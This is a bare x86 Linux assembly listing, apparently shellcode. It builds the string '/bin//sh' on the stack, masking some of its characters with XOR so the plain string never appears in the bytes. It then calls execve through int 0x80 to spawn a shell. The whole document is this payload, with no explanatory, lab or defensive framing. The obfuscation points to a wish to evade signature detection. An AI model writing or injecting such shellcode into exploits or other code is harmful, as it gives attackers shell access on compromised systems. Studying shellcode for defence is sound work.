global _start
section .text
_start:
xor eax,eax
push   eax
push   0x60732f2f
xor    [esp+3], byte 0x08
push   0x6069622f
xor    [esp+3], byte 0x0e
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
mov    al,11
int    0x80
